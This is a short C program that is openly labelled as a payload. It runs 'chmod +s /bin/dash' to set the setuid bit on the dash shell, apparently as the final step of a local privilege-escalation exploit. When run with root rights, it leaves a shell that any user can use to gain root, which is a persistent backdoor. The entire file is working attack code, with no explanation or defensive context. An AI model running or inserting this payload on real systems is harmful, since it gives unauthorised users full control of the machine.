#include <stdlib.h>
#include <stdio.h>

int main(void) {
    printf("[+] Executing payload. Giving suid perms to /bin/dash\n");
    system("chmod +s /bin/dash");
}
